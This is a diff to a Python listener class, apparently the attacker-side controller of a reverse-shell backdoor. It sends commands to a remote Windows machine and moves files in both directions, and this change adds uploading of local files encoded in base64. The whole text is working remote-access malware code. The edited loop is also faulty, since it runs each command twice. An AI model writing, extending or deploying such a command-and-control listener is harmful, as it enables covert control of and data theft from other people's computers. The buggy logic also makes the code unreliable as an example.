@@ -45,15 +45,25 @@ class SocketListener:
             file_bytes = base64.b64decode(content)
             with open(path, "wb") as my_file:
                 my_file.write(file_bytes)
-                return "Download completed successfully"
+                return "Downloaded successfully"
         except Exception:
             return "Error saving file"
+
+    # Uploading file contents
+    def get_file_contents(self,path):
+        with open(path, "rb") as my_file:
+            return base64.b64encode(my_file.read()).decode()
 
     def start_listener(self):
         while True:
             command_input = raw_input("Windows C:\\User\\IEUser\\> ")
             command_input = command_input.split(" ")
             command_output = self.command_execution(command_input).decode()
+
+            if command_input[0] == "upload":
+                file_contents = self.get_file_contents(command_input[1])
+                command_input.append(file_contents)
+            command_output = self.command_execution(command_input)
 
             if command_input[0] == "download":
                 command_output = self.save_file(command_input[1],command_output)
